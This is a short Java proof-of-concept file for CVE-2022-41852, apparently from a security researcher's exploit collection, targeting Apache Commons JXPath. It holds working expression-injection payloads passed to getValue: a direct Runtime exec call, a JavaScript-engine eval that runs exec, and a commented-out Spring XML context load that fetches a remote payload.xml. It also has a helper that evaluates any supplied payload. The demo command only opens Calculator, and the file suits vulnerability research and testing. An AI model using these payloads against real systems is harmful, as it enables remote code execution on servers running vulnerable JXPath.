package com.ppp.jxpath;

import org.apache.commons.jxpath.JXPathContext;

/**
 * @author Whoopsunix
 * CVE-2022-41852
 */
public class JxPathAttack {
    public static class User {
        String name;

    }

    public static void main(String[] args) {
        JXPathContext jxPathContext = JXPathContext.newContext(new User());

        // rce
        jxPathContext.getValue("exec(java.lang.Runtime.getRuntime(),'open -a Calculator')");

        // js
        jxPathContext.getValue("eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")')");

        // xml
//        Object object = jxPathContext.getValue("org.springframework.context.support.ClassPathXmlApplicationContext.new(\"http://127.0.0.1:1234/payload.xml\")");
    }

    public static Object eval(String poc) {
        JXPathContext jxPathContext = JXPathContext.newContext(new User());
        return jxPathContext.getValue(poc);
    }
}
